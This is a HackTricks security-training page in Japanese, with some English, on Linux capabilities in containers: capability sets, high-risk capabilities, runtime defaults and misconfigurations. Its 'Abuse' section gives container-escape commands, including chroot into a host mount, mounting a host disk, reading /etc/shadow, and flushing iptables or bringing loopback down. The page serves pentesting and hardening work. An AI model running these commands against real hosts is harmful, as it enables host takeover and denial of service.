# コンテナ内の Linux Capabilities

{{#include ../../../../banners/hacktricks-training.md}}

## 概要

Linux capabilities はコンテナセキュリティで最も重要な要素の一つです。なぜなら微妙だが根本的な問いに答えるからです：**コンテナ内での「root」は本当に何を意味するのか？** 通常の Linux システムでは、UID 0 は歴史的に非常に広い特権セットを示していました。現代のカーネルでは、その特権は capabilities と呼ばれるより小さな単位に分解されています。関連する capabilities が削除されていれば、プロセスが root として動作していても多くの強力な操作を行えないことがあります。

コンテナはこの区別に大きく依存します。多くのワークロードは互換性や単純さの理由でコンテナ内を UID 0 で起動され続けています。capability をドロップしなければ非常に危険です。capability をドロップすることで、コンテナ化された root プロセスは通常のコンテナ内タスクの多くを実行できる一方で、よりセンシティブなカーネル操作は拒否されます。だからこそ、`uid=0(root)` と表示されるコンテナのシェルが自動的に「ホストの root」や「広範なカーネル特権」を意味するわけではありません。実際にその root 身分がどれだけの価値を持つかは capability セットが決めます。

完全な Linux capability のリファレンスと多数の悪用例については、以下を参照してください：

{{#ref}}
../../linux-capabilities.md
{{#endref}}

## 動作

Capabilities は permitted、effective、inheritable、ambient、bounding などの複数のセットで追跡されます。多くのコンテナ評価においては、各セットの正確なカーネル意味論よりも最終的な実務的な問いの方が重要です：**このプロセスが今すぐに成功裏に実行できる特権操作は何か、そして将来的にどのような特権獲得がまだ可能か？**

これが重要な理由は、多くの脱出技術が実はコンテナ問題に見せかけた capability の問題であることが多いからです。`CAP_SYS_ADMIN` を持つワークロードは、通常のコンテナ root プロセスが触れてはならない多くのカーネル機能に到達できます。`CAP_NET_ADMIN` を持つワークロードはホストのネットワーク namespace を共有しているとさらに危険になります。`CAP_SYS_PTRACE` を持つワークロードはホスト PID 共有を通じてホストプロセスを見られるとさらに興味深くなります。Docker や Podman ではそれが `--pid=host` として現れ、Kubernetes では通常 `hostPID: true` として現れます。

言い換えれば、capability セットを単独で評価することはできません。namespaces、seccomp、および MAC policy と合わせて読み解く必要があります。

## ラボ

コンテナ内の capabilities を直接確認する非常に簡単な方法は：
```bash
docker run --rm -it debian:stable-slim bash
apt-get update && apt-get install -y libcap2-bin
capsh --print
```
より制限されたコンテナと、すべての capabilities が追加されたコンテナを比較することもできます:
```bash
docker run --rm debian:stable-slim sh -c 'grep CapEff /proc/self/status'
docker run --rm --cap-add=ALL debian:stable-slim sh -c 'grep CapEff /proc/self/status'
```
限定的な追加の効果を確認するには、すべてを削除して1つの capability のみを追加してみてください:
```bash
docker run --rm --cap-drop=ALL --cap-add=NET_BIND_SERVICE debian:stable-slim sh -c 'grep CapEff /proc/self/status'
```
These small experiments help show that a runtime is not simply toggling a boolean called "privileged". It is shaping the actual privilege surface available to the process.

## 高リスクなCapabilities

Although many capabilities can matter depending on the target, a few are repeatedly relevant in container escape analysis.

**`CAP_SYS_ADMIN`** は防御側が最も警戒すべきものだ。しばしば「the new root」と呼ばれる。マウント関連操作、namespace に依存する挙動、そしてコンテナに軽率に公開されるべきでない多くのカーネル経路など、膨大な機能を解放するためだ。コンテナが `CAP_SYS_ADMIN`、脆弱な seccomp、強力な MAC による拘束がない状態を持つと、多くの古典的なブレイクアウト経路がより現実的になる。

**`CAP_SYS_PTRACE`** はプロセスの可視性がある場合に重要になる。特に PID namespace が host や興味深い隣接ワークロードと共有されている場合だ。可視性を改ざんにつなげる可能性がある。

**`CAP_NET_ADMIN`** と **`CAP_NET_RAW`** はネットワーク中心の環境で重要だ。隔離されたブリッジネットワーク上でも既にリスクがある場合がある；host のネットワーク namespace を共有しているとさらに悪化し、ワークロードがホストのネットワークを再構成したり、スニッフィング、スプーフィング、ローカルトラフィックの干渉を行える可能性がある。

**`CAP_SYS_MODULE`** は rootful な環境では通常致命的だ。カーネルモジュールのロードは事実上ホストカーネルの制御を意味するため、汎用コンテナワークロードに現れるべきではほとんどない。

## Runtime Usage

Docker、Podman、containerd-based スタック、および CRI-O はいずれも capability コントロールを使用するが、デフォルトや管理インターフェースは異なる。Docker は `--cap-drop` や `--cap-add` といったフラグでそれらを非常に直接的に露出する。Podman は類似のコントロールを提供し、rootless 実行が追加の安全レイヤとして有効に働くことが多い。Kubernetes は Pod やコンテナの `securityContext` を通じて capability の追加・削除を表現する。LXC/Incus のような system-container 環境も capability 制御に依存するが、これらのシステムはホストとの統合が広いため、オペレータがアプリコンテナ環境よりもデフォルト設定をより緩めてしまいがちだ。

同じ原則がすべてに当てはまる：技術的に付与可能な capability が必ずしも付与すべきものではない。多くの実際のインシデントは、ワークロードがより厳しい構成で失敗したためにオペレータが手早く capability を追加し、チームが急場をしのごうとしたことから始まる。

## Misconfigurations

最も明白なミスは Docker/Podman スタイルの CLI における **`--cap-add=ALL`** だが、それだけではない。実際には、より一般的な問題は一つか二つの非常に強力な capability、特に `CAP_SYS_ADMIN` を「アプリケーションを動かすために」付与し、その際に namespace、seccomp、mount の影響を理解していないことだ。別のよくある失敗モードは、追加の capability と host namespace の共有を組み合わせることだ。Docker や Podman では `--pid=host`、`--network=host`、`--userns=host` のように現れ、Kubernetes では `hostPID: true` や `hostNetwork: true` のようなワークロード設定として同等の露出が現れる。これらの組み合わせは、それぞれ capability が実際に何に影響を与え得るかを変える。

ワークロードが完全に `--privileged` ではないからといって意味のある制約があると管理者が考えるケースもよくある。時にはそれは真だが、実効的なポスチャが既にほぼ privileged に近く、区別が運用上意味をなさなくなることもある。

## Abuse

最初の実践的なステップは、実効的な capability セットを列挙し、脱出やホスト情報アクセスに関わる capability ごとのアクションを直ちにテストすることだ：
```bash
capsh --print
grep '^Cap' /proc/self/status
```
`CAP_SYS_ADMIN` が付与されている場合、まず mount-based abuse と host filesystem access をテストしてください。これは最も一般的な breakout enablers の一つだからです：
```bash
mkdir -p /tmp/m
mount -t tmpfs tmpfs /tmp/m 2>/dev/null && echo "tmpfs mount works"
mount | head
find / -maxdepth 3 -name docker.sock -o -name containerd.sock -o -name crio.sock 2>/dev/null
```
もし `CAP_SYS_PTRACE` が存在し、コンテナが興味深いプロセスを確認できる場合、その capability をプロセスの検査に転用できるか検証する:
```bash
capsh --print | grep cap_sys_ptrace
ps -ef | head
for p in 1 $(pgrep -n sshd 2>/dev/null); do cat /proc/$p/cmdline 2>/dev/null; echo; done
```
`CAP_NET_ADMIN` または `CAP_NET_RAW` が存在する場合、ワークロードが可視のネットワークスタックを操作できるか、あるいは少なくとも有用な network intelligence を収集できるかをテストする:
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw'
ip addr
ip route
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
```
コンテナで capability のテストが成功したら、それを namespace の状況と組み合わせて考える。隔離された namespace では単にリスクに見える capability でも、コンテナが host PID、host network、または host mounts を共有していると、即座に escape や host-recon のプリミティブになり得る。

### 完全な例: `CAP_SYS_ADMIN` + Host Mount = Host Escape

コンテナが `CAP_SYS_ADMIN` を持ち、`/host` のようなホストファイルシステムの書き込み可能な bind mount を持っている場合、エスケープ経路はしばしば単純です:
```bash
capsh --print | grep cap_sys_admin
mount | grep ' /host '
ls -la /host
chroot /host /bin/bash
```
もし `chroot` が成功すれば、コマンドはホストのルートファイルシステムのコンテキストで実行されます:
```bash
id
hostname
cat /etc/shadow | head
```
`chroot` が利用できない場合、同じ結果はマウントされたツリーを介して binary を呼び出すことでしばしば得られます:
```bash
/host/bin/bash -p
export PATH=/host/usr/sbin:/host/usr/bin:/host/sbin:/host/bin:$PATH
```
### 完全な例: `CAP_SYS_ADMIN` + Device Access

ホストから block device が公開されている場合、`CAP_SYS_ADMIN` はそれを直接ホストの filesystem access に変えることができます：
```bash
ls -l /dev/sd* /dev/vd* /dev/nvme* 2>/dev/null
mkdir -p /mnt/hostdisk
mount /dev/sda1 /mnt/hostdisk 2>/dev/null || mount /dev/vda1 /mnt/hostdisk 2>/dev/null
ls -la /mnt/hostdisk
chroot /mnt/hostdisk /bin/bash 2>/dev/null
```
### 完全な例: `CAP_NET_ADMIN` + Host Networking

この組み合わせは常に host root を直接生み出すとは限りませんが、host の network stack を完全に再構成できます:
```bash
capsh --print | grep cap_net_admin
ip addr
ip route
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link set lo down 2>/dev/null
iptables -F 2>/dev/null
```
これは denial of service、traffic interception、またはこれまでフィルタリングされていたサービスへのアクセスを可能にする可能性がある。

## Checks

capability checks の目的は単に生の値をダンプすることではなく、プロセスが現在の namespace と mount の状況を危険にするのに十分な権限を持っているかを理解することにある。
```bash
capsh --print                    # Human-readable capability sets and securebits
grep '^Cap' /proc/self/status    # Raw kernel capability bitmasks
```
ここで注目すべき点:

- `capsh --print` は、`cap_sys_admin`、`cap_sys_ptrace`、`cap_net_admin`、`cap_sys_module` のような高リスクな capabilities を見つける最も簡単な方法です。
- `/proc/self/status` の `CapEff` 行は、他のセットで利用可能かもしれないものではなく、現在実際に有効なものを示します。
- コンテナがホストの PID、network、user namespaces を共有している、またはホストマウントが書き込み可能な場合、capability dump はさらに重要になります。

生の capability 情報を収集した後、次のステップは解釈です。プロセスが root か、user namespaces が有効か、host namespaces が共有されているか、seccomp が適用されているか、AppArmor または SELinux が依然としてプロセスを制限しているかを確認してください。capability set 自体は物語の一部に過ぎませんが、同じ見かけ上の出発点でも一方の container breakout が成功しもう一方が失敗する理由を説明することが多いのはこの部分です。

## ランタイムのデフォルト

| Runtime / platform | デフォルト状態 | デフォルトの振る舞い | よくある手動での弱体化 |
| --- | --- | --- | --- |
| Docker Engine | デフォルトでは削減された capability セット | Docker はデフォルトで capabilities の allowlist を保持し、その他をドロップします | `--cap-add=<cap>`, `--cap-drop=<cap>`, `--cap-add=ALL`, `--privileged` |
| Podman | デフォルトでは削減された capability セット | Podman コンテナはデフォルトで unprivileged で、削減された capability モデルを使用します | `--cap-add=<cap>`, `--cap-drop=<cap>`, `--privileged` |
| Kubernetes | 変更がない限りランタイムのデフォルトを継承します | `securityContext.capabilities` が指定されていない場合、コンテナはランタイムのデフォルト capability セットを取得します | `securityContext.capabilities.add`, failing to `drop: [\"ALL\"]`, `privileged: true` |
| containerd / CRI-O under Kubernetes | 通常はランタイムのデフォルト | 有効なセットはランタイムと Pod spec に依存します | Kubernetes 行と同様; 直接 OCI/CRI の設定でも明示的に capabilities を追加できます |

Kubernetes にとって重要なのは、API が単一の普遍的なデフォルト capability セットを定義していないことです。Pod が capability を追加またはドロップしない場合、ワークロードはそのノードのランタイムデフォルトを継承します。
{{#include ../../../../banners/hacktricks-training.md}}
